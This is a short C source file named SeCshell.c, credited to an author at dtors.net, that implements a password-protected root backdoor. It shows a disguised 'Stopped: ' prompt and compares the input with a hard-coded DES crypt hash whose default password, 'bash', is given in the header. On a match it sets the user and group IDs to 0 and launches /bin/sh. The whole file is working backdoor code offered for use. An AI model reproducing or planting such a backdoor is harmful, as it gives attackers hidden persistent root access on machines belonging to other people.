/*
 * SeCshell.c
 *
 * Secure root shell, protected by standard DES encryption.
 *
 * default passwd is bash, enter that at stopped: prompt.
 *
 * Pir8@dtors.net ~~ www.dtors.net
 *
 */


#include <stdlib.h>
#include <string.h>
#define PWD "nU.ajj1cF2Qk6" /* standard DES */
int main() { /* Lets start the program */

	char *crypted=PWD;
	char *pass; /* variable for passwd */

	pass = (char *)getpass ("Stopped: "); /* lets get users pass */

	if (strcmp(crypt(pass,crypted),crypted)) { /* lets see if the pass entered matches */

		exit(1);
	}
	
	else 
	{
		setuid(0); /* remove this line if you dont want to get a root shell */
		setgid(0); /* remove this line if you dont want to get a root shell */
		execl("/bin/sh","sh -i",0); /* Execute shell */
	}
return 0;
}

